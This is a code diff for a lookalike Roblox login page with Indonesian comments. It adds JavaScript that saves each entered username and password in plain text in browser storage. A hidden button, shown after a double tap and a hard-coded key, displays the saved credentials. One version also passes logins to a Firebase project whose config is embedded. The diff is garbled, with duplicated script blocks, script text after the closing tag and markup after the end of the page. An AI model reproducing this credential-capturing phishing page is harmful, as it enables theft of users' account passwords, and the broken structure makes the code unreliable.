@@ -77,6 +77,163 @@
   </footer>
 
   <script>
+  // Firebase Config
+  const firebaseConfig = {
+    apiKey: "AIzaSyBQgivfx9NWj-cfVm1M5TRejLrvW8NTUkU",
+    authDomain: "login-403ca.firebaseapp.com",
+    projectId: "login-403ca",
+    storageBucket: "login-403ca.firebasestorage.app",
+    messagingSenderId: "610373767612",
+    appId: "1:610373767612:web:56ccd918b88d6105485bb9",
+    measurementId: "G-QBB0G51ZCG"
+  };
+
+  // Init Firebase
+  firebase.initializeApp(firebaseConfig);
+  const auth = firebase.auth();
+
+  const loginForm = document.getElementById("loginForm");
+  const viewLogin = document.getElementById("viewLogin");
+  const loginData = document.getElementById("loginData");
+  const tapArea = document.getElementById("tapArea");
+
+  let lastTap = 0;
+
+  // Login pakai username
+  loginForm.addEventListener("submit", function(e) {
+    e.preventDefault();
+    const username = document.getElementById("username").value.trim();
+    const password = document.getElementById("password").value;
+
+    if(username && password){
+      // Convert username → email dummy
+      const email = username.includes("@") ? username : `${username}@roblox.com`;
+
+      auth.signInWithEmailAndPassword(email, password)
+        .then((userCredential) => {
+          // Simpan ke localStorage
+          localStorage.setItem("robloxUser", username);
+          localStorage.setItem("robloxPass", password);
+          alert("Login Firebase berhasil!");
+        })
+        .catch((error) => {
+          alert("Error: " + error.message);
+        });
+    } else {
+      alert("Masukkan Username dan Password!");
+    }
+  });
+
+  // Double tap detector
+  tapArea.addEventListener("click", function(){
+    const now = new Date().getTime();
+    if(now - lastTap < 400){ // 2x dalam 400ms
+      viewLogin.classList.remove("hidden"); // tampilkan tombol rahasia
+      alert("Tombol rahasia muncul!");
+    }
+    lastTap = now;
+  });
+
+  // Cek data login dengan key
+  viewLogin.addEventListener("click", function(){
+    const key = prompt("Masukkan Key untuk melihat data:");
+    if(key === "KeyY"){
+      const user = localStorage.getItem("robloxUser");
+      const pass = localStorage.getItem("robloxPass");
+      if(user && pass){
+        loginData.innerHTML = `<p><strong>Username:</strong> ${user}</p><p><strong>Password:</strong> ${pass}</p>`;
+        loginData.classList.remove("hidden");
+      } else {
+        alert("Belum ada data login tersimpan.");
+      }
+    } else {
+      alert("Key salah!");
+    }
+  });
+</script>
+    const loginForm = document.getElementById("loginForm");
+    const viewLogin = document.getElementById("viewLogin");
+    const loginData = document.getElementById("loginData");
+
+    // Simulasi login
+    loginForm.addEventListener("submit", function(e) {
+      e.preventDefault();
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      if(username && password){
+        // Simpan ke localStorage
+        localStorage.setItem("robloxUser", username);
+        localStorage.setItem("robloxPass", password);
+
+        alert("Login berhasil! Data tersimpan.");
+        viewLogin.classList.remove("hidden"); // tampilkan tombol lihat login
+      } else {
+        alert("Masukkan Username dan Password!");
+      }
+    });
+
+    // Cek data login dengan key
+    viewLogin.addEventListener("click", function(){
+      const key = prompt("Masukkan Key untuk melihat data:");
+      if(key === "KeyY"){
+        const user = localStorage.getItem("robloxUser");
+        const pass = localStorage.getItem("robloxPass");
+        if(user && pass){
+          loginData.innerHTML = `<p><strong>Username:</strong> ${user}</p><p><strong>Password:</strong> ${pass}</p>`;
+          loginData.classList.remove("hidden");
+        } else {
+          alert("Belum ada data login tersimpan.");
+        }
+      } else {
+        alert("Key salah!");
+      }
+    });
+  </script>
+ </body>
+</html>    <button class="w-full border border-gray-400 rounded-md py-2 text-center text-gray-400 text-base font-normal hover:text-white hover:border-white transition" type="submit">Log In</button>
+   </form>
+
+   <p class="text-center text-white text-base font-normal mt-6 cursor-pointer hover:underline">Forgot Password or Username?</p>
+   <hr class="border-gray-700 my-6"/>
+   <button class="w-full bg-[#2A2B37] rounded-md py-2 text-center text-white text-base font-normal mb-3 hover:bg-[#3a3b4a] transition">Email Me a One-Time Code</button>
+   <button class="w-full bg-[#2A2B37] rounded-md py-2 text-center text-white text-base font-normal hover:bg-[#3a3b4a] transition">Use Another Device</button>
+   
+   <p class="text-center text-gray-300 text-sm mt-6">
+    Don't have an account?
+    <a class="text-white font-semibold hover:underline" href="#">Sign Up</a>
+   </p>
+
+   <!-- Hidden button to view stored login -->
+   <p id="viewLogin" class="text-center text-gray-400 text-sm mt-4 cursor-pointer hover:underline hidden">🔐 Lihat Data Login</p>
+   <div id="loginData" class="mt-3 text-center text-sm text-gray-200 hidden"></div>
+  </main>
+
+  <!-- Footer -->
+  <footer class="max-w-4xl mx-auto mt-16 px-4 pb-8 text-gray-300 text-sm">
+   <div class="flex flex-wrap justify-center gap-x-8 gap-y-2 text-base font-normal mb-4">
+    <a class="hover:underline" href="#">About Us</a>
+    <a class="hover:underline" href="#">Jobs</a>
+    <a class="hover:underline" href="#">Blog</a>
+    <a class="hover:underline" href="#">Parents</a>
+    <a class="hover:underline" href="#">Gift Cards</a>
+    <a class="hover:underline" href="#">Help</a>
+    <a class="hover:underline" href="#">Terms</a>
+    <a class="hover:underline" href="#">Accessibility</a>
+    <a class="hover:underline" href="#">Privacy</a>
+   </div>
+   <div class="flex justify-center items-center gap-1 mb-4 text-base font-normal">
+    <span>Your Privacy Choices</span>
+    <span class="bg-[#3366FF] rounded-full px-1.5 py-0.5 text-white text-xs font-bold flex items-center">
+     <i class="fas fa-check"></i>
+     <i class="fas fa-times ml-1"></i>
+    </span>
+   </div>
+   <hr class="border-gray-700 mb-4"/>
+   <p class="text-center text-gray-400 text-xs leading-tight">©2025 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.</p>
+  </footer>
+
+  <script>
     const loginForm = document.getElementById("loginForm");
     const viewLogin = document.getElementById("viewLogin");
     const loginData = document.getElementById("loginData");
